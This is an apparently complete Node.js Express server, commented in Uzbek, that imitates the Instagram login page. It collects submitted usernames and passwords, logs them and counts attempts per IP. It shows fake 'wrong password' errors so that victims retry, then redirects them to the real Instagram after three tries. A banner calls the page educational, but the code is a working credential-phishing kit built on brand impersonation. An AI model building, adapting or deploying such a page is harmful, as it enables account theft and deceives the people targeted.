const express = require("express");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Oddiy memory store (session o'rniga)
let attemptsStore = {};
const MAX_ATTEMPTS = 3;
const CLEANUP_INTERVAL = 30 * 60 * 1000; // 30 daqiqa

// Eski datani tozalash
setInterval(() => {
    const now = Date.now();
    for (const ip in attemptsStore) {
        if (now - attemptsStore[ip].timestamp > 15 * 60 * 1000) { // 15 daqiqadan eski
            delete attemptsStore[ip];
        }
    }
    console.log(`🔄 Xotira tozalandi. Jami IP: ${Object.keys(attemptsStore).length}`);
}, CLEANUP_INTERVAL);

app.post("/save", (req, res) => {
    try {
        const { username, password } = req.body;
        const ip = req.headers["x-forwarded-for"]?.split(",")[0] || 
                  req.ip || 
                  req.socket.remoteAddress || 
                  "unknown";
        
        const time = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });
        
        console.log(`📥 KIRITILDI → ${time} | IP: ${ip.slice(0, 15)}... | USER: ${username || 'yoq'} | PASS: ${'*'.repeat(password?.length || 0)}`);

        // IP asosida urinishlarni hisoblash (session emas)
        if (!attemptsStore[ip]) {
            attemptsStore[ip] = {
                count: 1,
                timestamp: Date.now(),
                username: username
            };
        } else {
            attemptsStore[ip].count++;
            attemptsStore[ip].timestamp = Date.now();
        }

        const attempts = attemptsStore[ip].count;
        console.log(`📊 ${ip.slice(0, 15)}... uchun urinish: ${attempts}/${MAX_ATTEMPTS}`);

        // Agar 3 marta urinib ko'rgan bo'lsa
        if (attempts >= MAX_ATTEMPTS) {
            console.log(`🎯 3/3 TOLDI → ${ip.slice(0, 15)}... Instagramga yo'naltirildi`);
            delete attemptsStore[ip]; // Tozalash
            
            // Instagram'ga redirect
            return res.redirect("https://www.instagram.com");
        }

        // Hali 3 marta emas
        const remaining = MAX_ATTEMPTS - attempts;
        
        // Eng oddiy HTML response (memory tejash uchun)
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <title>Xato - Instagram</title>
                <style>
                    body{font-family:system-ui;background:#fafafa;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}
                    .box{background:white;border:1px solid #dbdbdb;padding:40px;text-align:center;max-width:400px;width:100%;border-radius:10px;}
                    h2{color:#262626;margin-bottom:20px;}
                    .error{color:#ed4956;font-size:18px;margin:20px 0;padding:15px;background:#fee;border-radius:5px;}
                    .count{font-size:24px;color:#0095f6;margin:10px 0;}
                    .btn{background:#0095f6;color:white;border:none;padding:12px 30px;border-radius:8px;font-size:16px;cursor:pointer;margin-top:20px;width:100%;}
                    .btn:hover{background:#0081d6;}
                    .ip{color:#8e8e8e;font-size:12px;margin-top:20px;}
                </style>
            </head>
            <body>
                <div class="box">
                    <h2>❌ Kirish muvaffaqiyatsiz</h2>
                    <div class="error">Login yoki parol noto'g'ri</div>
                    <div class="count">${attempts}/${MAX_ATTEMPTS} urinish</div>
                    <p>Qolgan urinishlar: <strong>${remaining}</strong> ta</p>
                    <button class="btn" onclick="window.history.back()">Qayta urinish</button>
                    <div class="ip">IP: ${ip.slice(0, 10)}...</div>
                </div>
                <script>
                    setTimeout(() => {
                        window.history.back();
                    }, 3000);
                </script>
            </body>
            </html>
        `);

    } catch (error) {
        console.error("❌ XATO:", error.message);
        // Xatolik bo'lsa ham Instagram'ga yo'naltirish (hech qachon crash bo'lmasligi uchun)
        res.redirect("https://www.instagram.com");
    }
});

// Asosiy sahifa (minimal HTML)
app.get("/", (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Instagram - Kirish</title>
            <style>
                *{margin:0;padding:0;box-sizing:border-box;}
                body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fafafa;}
                .container{max-width:350px;margin:50px auto;padding:0 10px;}
                .login-box{background:white;border:1px solid #dbdbdb;padding:40px 40px 20px;text-align:center;}
                .logo{font-family:'Billabong',cursive;font-size:48px;margin:10px 0 30px;color:#262626;}
                input{width:100%;padding:10px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;margin-bottom:10px;font-size:14px;}
                input:focus{outline:none;border-color:#a8a8a8;}
                .login-btn{width:100%;padding:10px;background:#0095f6;color:white;border:none;border-radius:8px;font-weight:bold;font-size:14px;margin:15px 0;cursor:pointer;}
                .login-btn:hover{background:#0081d6;}
                .separator{display:flex;align-items:center;margin:20px 0;color:#8e8e8e;font-size:13px;}
                .separator::before,.separator::after{content:"";flex:1;height:1px;background:#dbdbdb;}
                .separator span{padding:0 20px;}
                .footer{margin-top:20px;padding:20px;background:white;border:1px solid #dbdbdb;text-align:center;font-size:14px;color:#8e8e8e;}
                .warning{background:#fff3cd;border:1px solid #ffeaa7;border-radius:5px;padding:10px;margin-bottom:15px;font-size:13px;color:#856404;}
                @font-face{font-family:'Billabong';src:url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong-webfont.ttf') format('truetype');}
                @media (max-width:400px){.container{margin:20px auto;}}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="login-box">
                    <div class="logo">Instagram</div>
                    
                    <div class="warning">
                        <strong>⚠️ Diqqat:</strong> Bu sahifa faqat o'quv maqsadida.
                    </div>
                    
                    <form action="/save" method="POST">
                        <input type="text" name="username" placeholder="Foydalanuvchi nomi" required>
                        <input type="password" name="password" placeholder="Parol" required>
                        <button type="submit" class="login-btn">Kirish</button>
                    </form>
                    
                    <div class="separator">
                        <span>YOKI</span>
                    </div>
                    
                    <div style="color:#385185;font-weight:bold;font-size:14px;cursor:pointer;margin-bottom:20px;">
                        Facebook bilan kirish
                    </div>
                    
                    <div style="font-size:12px;color:#00376b;cursor:pointer;">
                        Parolingizni unutdingizmi?
                    </div>
                </div>
                
                <div class="footer">
                    Hisobingiz yo'qmi? <a href="#" style="color:#0095f6;text-decoration:none;font-weight:bold;">Ro'yxatdan o'ting</a>
                </div>
            </div>
            
            <script>
                // Tez kirish uchun
                document.addEventListener('DOMContentLoaded', function() {
                    const form = document.querySelector('form');
                    const inputs = document.querySelectorAll('input');
                    
                    // Demo ma'lumotlar
                    inputs[0].value = "foydalanuvchi";
                    inputs[1].value = "parol123";
                    
                    form.addEventListener('submit', function(e) {
                        const username = inputs[0].value.trim();
                        const password = inputs[1].value.trim();
                        
                        if(!username || !password) {
                            e.preventDefault();
                            alert('Iltimos, barcha maydonlarni to\'ldiring!');
                            return;
                        }
                        
                        // Yuklash animatsiyasi
                        const btn = this.querySelector('.login-btn');
                        btn.innerHTML = 'Tekshirilmoqda...';
                        btn.style.opacity = '0.7';
                        btn.disabled = true;
                    });
                });
            </script>
        </body>
        </html>
    `);
});

// Stats endpoint (server holatini ko'rish uchun)
app.get("/stats", (req, res) => {
    const totalIPs = Object.keys(attemptsStore).length;
    const now = Date.now();
    const recentAttempts = Object.values(attemptsStore)
        .filter(item => now - item.timestamp < 5 * 60 * 1000).length;
    
    res.json({
        status: "🟢 Server ishlayapti",
        uptime: process.uptime(),
        memoryUsage: process.memoryUsage(),
        attempts: {
            totalIPs: totalIPs,
            recent5min: recentAttempts,
            storeSize: JSON.stringify(attemptsStore).length
        }
    });
});

// 404 handler
app.use((req, res) => {
    res.redirect("/");
});

// Error handler (hech qachon crash bo'lmasligi uchun)
process.on('uncaughtException', (error) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', error.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🔥 UNHANDLED REJECTION at:', promise, 'reason:', reason);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
    🚀 Server ${PORT}-portda ishga tushdi!
    🌐 http://localhost:${PORT}
    📊 Stats: http://localhost:${PORT}/stats
    
    ==== KONFIGURATSIYA ====
    🔹 Max urinishlar: ${MAX_ATTEMPTS} marta
    🔹 Tozalash: har 30 daqiqada
    🔹 Xotira: ${Object.keys(attemptsStore).length} ta IP
    ========================
    `);
});
